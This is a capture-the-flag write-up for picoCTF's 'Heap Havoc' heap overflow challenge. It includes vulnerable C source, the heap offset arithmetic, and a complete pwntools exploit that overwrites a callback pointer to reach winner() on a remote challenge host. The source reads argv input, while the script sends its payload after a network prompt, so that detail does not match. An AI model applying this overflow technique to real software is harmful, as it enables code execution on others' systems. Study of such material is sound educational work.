# CyLab — Heap Havoc

* **Platform:** CyLab Security Academy / picoCTF 2026 (Challenge ID: `763`)
* **Category:** Binary Exploitation / Heap Overflow & Function Pointer Overwrite (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, Heap Layout Analysis
* **Binary:** `vuln` (32-bit x86 ELF)

---

## TL;DR

The binary manages two network connection structures allocated sequentially on the heap: `i1` and `i2`. User input is copied into `i1->name` using unbounded `strcpy(i1->name, argv[1])`, allowing a heap buffer overflow that extends directly into the adjacent `i2` chunk. Struct `i2` contains an integer `priority`, a pointer `name`, and a function pointer `callback`. Crucially, because the binary executes `strcpy(i2->name, argv[2])` before invoking the callback, overwriting `i2->name` with random bytes causes an immediate crash. By setting `i2->name` to a writable section (`.bss`) and overwriting `i2->callback` with `winner()` at `0x080492b6`, the program executes the callback and prints the flag.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    SHSTK:    SHSTK/IBT Enabled
```

Key observations:
1. **No PIE:** Fixed base address at `0x08048000`. Global symbols and functions are at static addresses.
2. **Adjacent Sequential Allocations:** Consecutive `malloc()` calls place heap chunks directly contiguous to each other.
3. **Target Function Available:** Symbol `winner` is located at `0x080492b6`, which directly reads and outputs `flag.txt`.

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
struct internet {
    int priority;           // Offset +0x0
    char *name;             // Offset +0x4
    void (*callback)();     // Offset +0x8
};

int main(int argc, char **argv) {
    struct internet *i1 = malloc(sizeof(struct internet));  // 16-byte chunk
    i1->name = malloc(8);                                   // 16-byte chunk

    struct internet *i2 = malloc(sizeof(struct internet));  // 16-byte chunk
    i2->name = malloc(8);                                   // 16-byte chunk

    strcpy(i1->name, argv[1]);    // VULNERABILITY: Unbounded heap overflow into i2
    strcpy(i2->name, argv[2]);    // Must point to valid writable memory!

    if (i1->callback) i1->callback();
    if (i2->callback) i2->callback();   // Target execution primitive!
    return 0;
}
```

### 2. Heap Chunk Layout & Alignment

On 32-bit Linux glibc heaps, chunks are aligned to 8-byte boundaries with an 8-byte metadata header (`prev_size` + `size`).
- `malloc(12)` (`sizeof(struct internet)`) yields a 16-byte chunk.
- `malloc(8)` yields a 16-byte chunk (8 bytes user payload + 8 bytes header).

Heap memory layout:

```text
       Lower Heap Addresses
  +-----------------------------------+
  |  i1 struct (16 bytes)             |
  +-----------------------------------+
  |  i1->name buffer (8B payload)     |  <-- Overflow starts here!
  +-----------------------------------+
  |  i2 chunk metadata:               |
  |    prev_size (4 bytes)            |  Offset +08..11
  |    size (4 bytes)                 |  Offset +12..15
  +-----------------------------------+
  |  i2 struct fields:                |
  |    priority (4 bytes)             |  Offset +16..19
  |    name pointer (4 bytes)         |  Offset +20..23 (Must be WRITABLE!)
  |    callback pointer (4 bytes)     |  Offset +24..27 (Target: winner)
  +-----------------------------------+
       Higher Heap Addresses
```

Offset from `i1->name` user buffer to `i2->callback`:
$$8 \text{ (user payload)} + 4 \text{ (prev\_size)} + 4 \text{ (size)} + 4 \text{ (priority)} + 4 \text{ (name)} = 24 \text{ bytes}$$

---

## Dynamic Analysis & Exploitation Strategy

### 1. The Secondary Dereference Hurdle
The program executes:
```c
strcpy(i2->name, argv[2]);
```
If our overflow clobbers `i2->name` with non-writable or unmapped bytes, the second `strcpy()` triggers an immediate segmentation fault before reaching `i2->callback()`.
We resolve this by setting `i2->name = BSS_ADDR` (`0x0804c040`), directing the second copy harmlessly into writable static memory.

### 2. Payload Structure
- `payload1` (supplied as `argv[1]`):
  - 8 bytes padding (`b"A" * 8`)
  - 4 bytes padding (`b"B" * 4` for `prev_size`)
  - 4 bytes padding (`b"C" * 4` for `size`)
  - 4 bytes padding (`b"D" * 4` for `priority`)
  - `p32(0x0804c040)` (`.bss` pointer for `i2->name`)
  - `p32(0x080492b6)` (`winner` address for `i2->callback`)
- `payload2` (supplied as `argv[2]`):
  - `b"X"` (harmless single character written into `.bss`).

### 3. Execution
When `main()` reaches `i2->callback()`, it dereferences our injected address and branches to `winner()`, printing `flag.txt`.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST, PORT = "foggy-cliff.picoctf.net", 52962
WINNER = 0x080492b6
BSS_ADDR = 0x0804c040

def solve(io):
    # Construct overflow payload targeting i2 struct
    # 8B buf + 8B header + 4B priority + 4B name (BSS) + 4B callback (winner)
    payload1 = b"A" * 8 + b"B" * 4 + b"C" * 4 + b"D" * 4
    payload1 += p32(BSS_ADDR)
    payload1 += p32(WINNER)

    payload2 = b"X"

    io.recvuntil(b"Enter two names separated by space:")
    io.sendline(payload1 + b" " + payload2)

    data = io.recvall(timeout=3)
    m = re.search(rb"(academy\{[^}]+\}|picoCTF\{[^}]+\})", data)
    if m:
        log.success(f"Flag captured: {m.group(1).decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to foggy-cliff.picoctf.net on port 52962: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to foggy-cliff.picoctf.net port 52962
```

---

## Key Takeaways & Lessons

1. **Adjacent Heap Chunk Corruption:** In simple sequentially allocated heaps without ASLR, data chunks sit directly preceding subsequent structures, allowing direct linear overwrites of pointers and metadata.
2. **Surviving Intermediate Dereferences:** When overflowing a structure containing multiple pointers, every pointer evaluated before the target sink must be set to valid, appropriately-permissioned memory (such as `.bss` for writes) to prevent early crashes.
3. **Function Pointers in Structs:** Structures that store callback functions within writable heap memory are extremely vulnerable to adjacent buffer overflows, completely bypassing stack-based canary defenses.
